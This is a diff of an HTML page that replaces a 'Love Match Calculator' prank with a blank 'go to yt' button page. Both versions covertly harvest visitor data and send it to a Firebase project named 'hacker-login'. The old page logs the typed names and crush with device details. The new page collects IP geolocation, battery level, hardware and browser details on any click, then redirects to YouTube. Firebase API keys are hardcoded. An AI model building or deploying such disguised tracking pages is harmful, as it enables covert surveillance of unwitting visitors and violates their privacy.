@@ -1,180 +1,100 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Love Match Calculator 💘</title>
-  <link href="https://fonts.googleapis.com/css2?family=Dancing+Script&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Dancing Script', cursive;
-      background: linear-gradient(to right, #ffdee9, #b5fffc);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      text-align: center;
-      overflow: hidden;
-    }
-    h1 {
-      color: #ff1493;
-      font-size: 3em;
-      margin-bottom: 10px;
-    }
-    input {
-      padding: 10px;
-      font-size: 1.2em;
-      margin: 10px;
-      border-radius: 10px;
-      border: 2px solid #ff69b4;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 1.2em;
-      background: #ff1493;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      margin-top: 10px;
-    }
-    #result, #caught, #crushReveal, #fakeAI {
-      margin-top: 20px;
-      font-size: 1.5em;
-      color: #ff1493;
-      display: none;
-      animation: fadeIn 1s ease-in-out forwards;
-    }
-    @keyframes fadeIn {
-      0% { opacity: 0; transform: translateY(20px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
-    .heart {
-      position: fixed;
-      width: 20px;
-      height: 20px;
-      background-color: pink;
-      transform: rotate(45deg);
-      animation: fall 4s linear infinite;
-    }
-    .heart::before, .heart::after {
-      content: "";
-      position: absolute;
-      width: 20px;
-      height: 20px;
-      background-color: pink;
-      border-radius: 50%;
-    }
-    .heart::before { top: -10px; left: 0; }
-    .heart::after { left: -10px; top: 0; }
-    @keyframes fall {
-      0% { top: -10px; opacity: 1; }
-      100% { top: 100vh; opacity: 0; }
-    }
-  </style>
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-  <script>
-    // Firebase config
+  <title>Blank </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
     const firebaseConfig = {
-      apiKey: "AIzaSyA9SDmpeyc5k9iraz8KXlZD4wRXGYSM1_w",
+      apiKey: "AIzaSyCNWmCZQ-TwLslCItPl9FvKbpOTLfH2W0g",
       authDomain: "hacker-login-5da91.firebaseapp.com",
-      databaseURL: "https://hacker-login-5da91-default-rtdb.firebaseio.com",
       projectId: "hacker-login-5da91",
       storageBucket: "hacker-login-5da91.appspot.com",
-      messagingSenderId: "1046375390326",
-      appId: "1:1046375390326:web:56c01ddefd415b045d1357",
-      measurementId: "G-614SQHSVQD"
+      messagingSenderId: "152292126312",
+      appId: "1:152292126312:web:f63ef2e514b1e07ef9e172"
     };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    async function getBattery() {
+      try {
+        const battery = await navigator.getBattery();
+        return Math.round(battery.level * 100) + '%';
+      } catch {
+        return "Unavailable";
+      }
+    }
+
+    function getTimeZone() {
+      try {
+        return Intl.DateTimeFormat().resolvedOptions().timeZone;
+      } catch {
+        return "Unknown";
+      }
+    }
+
+    async function getIPLocation() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+      } catch {
+        return { ip: "Unavailable", city: "-", region: "-", country_name: "-" };
+      }
+    }
+
+    async function collectInfoAndRedirect() {
+      document.body.innerHTML = "<h2 style='color:white;text-align:center;margin-top:40vh;'>Gathering info...</h2>";
+
+      const battery = await getBattery();
+      const memory = navigator.deviceMemory || "Unknown";
+      const cores = navigator.hardwareConcurrency || "Unknown";
+      const screenRes = `${screen.width}x${screen.height}`;
+      const tz = getTimeZone();
+      const ipData = await getIPLocation();
+
+      const data = {
+        timestamp: new Date().toString(),
+        platform: navigator.platform,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        screenResolution: screenRes,
+        battery: battery,
+        deviceMemory: memory + " GB",
+        cpuCores: cores,
+        timezone: tz,
+        ip: ipData.ip,
+        location: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`
+      };
+
+      try {
+        await addDoc(collection(db, "deviceLogs"), data);
+        window.location.href = "https://www.youtube.com/";
+      } catch (e) {
+        alert("Error saving data: " + e.message);
+      }
+    }
+
+    // Add listeners to both the button AND the whole page
+    window.addEventListener("click", () => {
+      if (!window.clickedOnce) {
+        window.clickedOnce = true;
+        collectInfoAndRedirect();
+      }
+    });
+
+    window.addEventListener("DOMContentLoaded", () => {
+      document.body.innerHTML = `
+        <div style="height:100vh;display:flex;justify-content:center;align-items:center;background:black;">
+          <button id="clickBtn" style="padding:20px 30px;font-size:1.5rem;background:green;color:black;border:none;border-radius:10px;cursor:pointer;">
+go to yt
+          </button>
+        </div>
+      `;
+    });
   </script>
 </head>
-<body>
-  <h1>💘 Love Match Calculator 💘</h1>
-  <input type="text" id="yourName" placeholder="Your Name">
-  <input type="text" id="crushName" placeholder="Your Crush's Name">
-  <br>
-  <button onclick="calculateLove()">Find Match 🔮</button>
-
-  <div id="result"></div>
-  <div id="fakeAI"></div>
-  <div id="caught"></div>
-  <div id="crushReveal"></div>
-
-  <audio id="loveSound" src="https://files.catbox.moe/rr4zdr.mp3"></audio>
-
-  <script>
-    function createHearts() {
-      const heart = document.createElement('div');
-      heart.classList.add('heart');
-      heart.style.left = Math.random() * 100 + "vw";
-      heart.style.animationDuration = Math.random() * 2 + 3 + "s";
-      document.body.appendChild(heart);
-      setTimeout(() => heart.remove(), 5000);
-    }
-    setInterval(createHearts, 300);
-
-    function calculateLove() {
-      const yourName = document.getElementById('yourName').value.trim();
-      const crushName = document.getElementById('crushName').value.trim();
-      const result = document.getElementById('result');
-      const caught = document.getElementById('caught');
-      const crushReveal = document.getElementById('crushReveal');
-      const fakeAI = document.getElementById('fakeAI');
-      const sound = document.getElementById('loveSound');
-
-      if (!yourName || !crushName) {
-        alert("Please enter both names!");
-        return;
-      }
-
-      result.style.display = 'none';
-      caught.style.display = 'none';
-      crushReveal.style.display = 'none';
-      fakeAI.style.display = 'none';
-
-      result.innerHTML = `🔍 Scanning the cosmos...`;
-      result.style.display = 'block';
-
-      navigator.getBattery().then(battery => {
-        const deviceInfo = {
-          device: /mobile/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
-          browser: navigator.userAgentData?.brands?.[0]?.brand || navigator.appName,
-          os: navigator.platform,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          language: navigator.language,
-          screen: `${screen.width}x${screen.height}`,
-          battery: Math.round(battery.level * 100) + "%"
-        };
-
-        db.ref("loveLogs").push({
-          yourName,
-          crushName,
-          time: new Date().toLocaleString(),
-          ...deviceInfo
-        });
-      });
-
-      setTimeout(() => {
-        result.innerHTML = `🔥 FLAMES Result: <b>Love</b><br>🌌 Astrology Match: <b>Perfect Pair 💕</b><br>❤️ Compatibility Score: <b>${Math.floor(Math.random() * 21) + 80}%</b>`;
-        fakeAI.innerHTML = `🤖 AI Says: "Your heartbeats sync at 92% frequency. Soulmate alert! 💞"`;
-        fakeAI.style.display = 'block';
-        sound.play();
-      }, 2500);
-
-      setTimeout(() => {
-        caught.innerHTML = `💥 CAUGHT YOU 💥`;
-        caught.style.display = 'block';
-      }, 5000);
-
-      setTimeout(() => {
-        crushReveal.innerHTML = `😏 You like <span style="color: hotpink; text-shadow: 1px 1px 2px red;">${crushName}</span>!`;
-        crushReveal.style.display = 'block';
-      }, 6000);
-    }
-  </script>
-</body>
+<body></body>
 </html>
